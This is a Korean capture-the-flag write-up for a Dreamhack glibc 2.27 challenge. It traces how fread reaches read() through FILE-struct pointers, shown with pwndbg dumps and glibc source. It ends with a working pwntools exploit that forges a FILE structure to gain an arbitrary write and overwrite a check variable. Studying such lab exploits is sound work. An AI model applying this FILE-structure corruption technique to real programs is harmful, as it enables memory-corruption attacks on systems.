info -> glibc 2.27 ver

---
```c
// Name: iofile_aaw
// gcc -o iofile_aaw iofile_aaw.c -no-pie 

#include <stdio.h>
#include <unistd.h>
#include <string.h>

char flag_buf[1024];
int overwrite_me;

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int read_flag() {
  FILE *fp;
  fp = fopen("/home/iofile_aaw/flag", "r");
  fread(flag_buf, sizeof(char), sizeof(flag_buf), fp);

  write(1, flag_buf, sizeof(flag_buf));
  fclose(fp);
}

int main() {
  FILE *fp;

  char file_buf[1024];

  init();

  fp = fopen("/etc/issue", "r");

  printf("Data: ");

  read(0, fp, 300);

  fread(file_buf, 1, sizeof(file_buf)-1, fp);

  printf("%s", file_buf);

  if( overwrite_me == 0xDEADBEEF) 
    read_flag();

  fclose(fp);
}
```

---
FILE 스트림 구조체와 fread가어떻게 흘러가는지 알아야한다

```c
   0x000000000040087a <+79>:	mov    rax,QWORD PTR [rbp-0x418]
   0x0000000000400881 <+86>:	mov    edx,0x12c
   0x0000000000400886 <+91>:	mov    rsi,rax
   0x0000000000400889 <+94>:	mov    edi,0x0
   0x000000000040088e <+99>:	call   0x400670 <read@plt>
```
main의 어셈블리 코드를 보면 fp의 값이 $rbp - 0x418에 있는것을 알 수 있다

```c
pwndbg> x/gx $rbp-0x418
0x7fffffffdd98:	0x00000000006022a0
```
해당 값을 확인해보니 0x6022a0라는 어떤주소값이 들어있다

```c
pwndbg> set $myfp = *(long *)($rbp-0x418)
```
해당 주소를 myfp로 설정해서 분석할수도있다


그냥 구조체로 확인해보면
```c
pwndbg> p *(FILE *)0x6022a0
$1 = {
  _flags = -72539000,
  _IO_read_ptr = 0x0,
  _IO_read_end = 0x0,
  _IO_read_base = 0x0,
  _IO_write_base = 0x0,
  _IO_write_ptr = 0x0,
  _IO_write_end = 0x0,
  _IO_buf_base = 0x0,
  _IO_buf_end = 0x0,
  _IO_save_base = 0x0,
  _IO_backup_base = 0x0,
  _IO_save_end = 0x0,
  _markers = 0x0,
  _chain = 0x7ffff7fab5c0 <_IO_2_1_stderr_>,
  _fileno = 3,
  _flags2 = 0,
  _old_offset = 0,
  _cur_column = 0,
  _vtable_offset = 0 '\000',
  _shortbuf = "",
  _lock = 0x602380,
  _offset = -1,
  _codecvt = 0x0,
  _wide_data = 0x602390,
  _freeres_list = 0x0,
  _freeres_buf = 0x0,
  __pad5 = 0,
  _mode = 0,
  _unused2 = '\000' <repeats 19 times>
}
```
FILE stream의 내부모습을 볼수있다 해당 주소에

```c
  read(0, fp, 300);
```
우리는 read로 값을 입력하므로 FILE 스트림의 내부를 덮을수있다

실제로 a를 120개입력한경우

```c
pwndbg> p *(FILE *)0x6022a0
$2 = {
  _flags = 1633771617,
  _IO_read_ptr = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>,
  _IO_read_end = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>,
  _IO_read_base = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>,
  _IO_write_base = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>,
  _IO_write_ptr = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>,
  _IO_write_end = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>,
  _IO_buf_base = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>,
  _IO_buf_end = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>,
  _IO_save_base = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>,
  _IO_backup_base = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>,
  _IO_save_end = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>,
  _markers = 0x0,
  _chain = 0x6161616161616161,
  _fileno = 1633771873,
  _flags2 = 1633771873,
  _old_offset = 10,
  _cur_column = 0,
  _vtable_offset = 0 '\000',
  _shortbuf = "",
  _lock = 0x602380,
  _offset = -1,
  _codecvt = 0x0,
  _wide_data = 0x602390,
  _freeres_list = 0x0,
  _freeres_buf = 0x0,
  __pad5 = 0,
  _mode = 0,
  _unused2 = '\000' <repeats 19 times>
}
```
해당 스트림 내부가 a로 덮힌것을 확인했다


---
여기서 부터 중요한데 fread는 다음 과정을거쳐 함수가 실행된다 먼저
```c
#define fread(p, m, n, s) _IO_fread (p, m, n, s) 
size_t 
_IO_fread (void *buf, size_t size, size_t count, FILE *fp) 
{ 
	size_t bytes_requested = size * count; 
	size_t bytes_read; 
	CHECK_FILE (fp, 0); 
	if (bytes_requested == 0) 
		return 0; 
	_IO_acquire_lock (fp); 
	bytes_read = _IO_sgetn (fp, (char *) buf,bytes_requested); 
	_IO_release_lock (fp); 
	return bytes_requested == bytes_read ? count : bytes_read / size; 
}
```
요 IO_sgetn 이라는 함수를 부른다 

```c
#define _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N) 
#define JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1, X2) #define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable ( (THIS))) 
size_t 
_IO_sgetn (FILE *fp, void *data, size_t n) 
{ /* FIXME handle putback buffer here! */ 
	return _IO_XSGETN (fp, data, n); 
}
```
sgetn함수는 xsgent라는 함수를 부른다


해당함수는
```c
_IO_size_t 
_IO_file_xsgetn (_IO_FILE *fp, void *data, _IO_size_t n) { 
	_IO_size_t want, have; 
	_IO_ssize_t count;
	_char *s = data; 
	want = n; ... /* If we now want less than a buffer, underflow and repeat the         copy. Otherwise, _IO_SYSREAD directly to the user buffer. */ 
	if (fp->_IO_buf_base && want < (size_t) (fp->_IO_buf_end - fp->_IO_buf_base)) 
	{ 
		if (__underflow (fp) == EOF) 
			break; 
		continue; 
	} 
}
```
IO_new_file_underflow 라는 함수를 호출한다

```c
int _IO_new_file_underflow (FILE *fp) { 
	ssize_t count; 
	if (fp->_flags & _IO_NO_READS) { 
		fp->_flags |= _IO_ERR_SEEN;
		__set_errno (EBADF); return EOF; 
		} ... 
		count = _IO_SYSREAD (fp, fp->_IO_buf_base, fp->_IO_buf_end - fp->_IO_buf_base); 
}
```
underflow함수를 보면 IO_SYSREAD라는 함수를 통해 fp 구조체를 전달하는 모습을 볼수있다

```c
_IO_SYSREAD (fp, fp->_IO_buf_base, fp->_IO_buf_end - fp->_IO_buf_base); 
```
이부분 그럼 이함수는 무엇이냐

```c
define _IO_SYSREAD(FP, DATA, LEN) \ JUMP2(__read, FP, DATA, LEN)
```
한번더 vtable을 탄다 결론적으로 read함수를 call하는것을 볼수있다

```c
_IO_ssize_t _IO_file_read (_IO_FILE *fp, void *buf, _IO_ssize_t size) { 
return (__builtin_expect (fp->_flags2 & _IO_FLAGS2_NOTCANCEL, 0) 
	? __read_nocancel (fp->_fileno, buf, size) 
	: __read (fp->_fileno, buf, size)); }
```

결론적으로 io file read함수가 호출되는데 fileno buf size 총이렇게 3개를 입력받는다
근데 이값은 

```c
_IO_SYSREAD (fp, fp->_IO_buf_base, fp->_IO_buf_end - fp->_IO_buf_base); 
```
위에서 이렇게 전달했으므로 해당값들을 우리가 변조해주면된다

---

payload
```c
import time
from pwn import *

p = remote("host8.dreamhack.games",8453)
e = ELF("./iofile_aaw")

overwrite_me = e.symbols["overwrite_me"]
#overwrite_me = 0x6014a0

payload = p64(0xfbad2488) #flag
payload += p64(0) #read_ptr
payload += p64(0) #end_ptr
payload += p64(0) #read_base ...
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(overwrite_me) #_IO_buf_base
payload += p64(overwrite_me + 1024) #_IO_buf_end
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0) #_fileno

p.sendafter(b"Data: ",payload)
time.sleep(1)
p.send(p64(0xDEADBEEF) + b"\x00"*1024)

p.interactive()
```
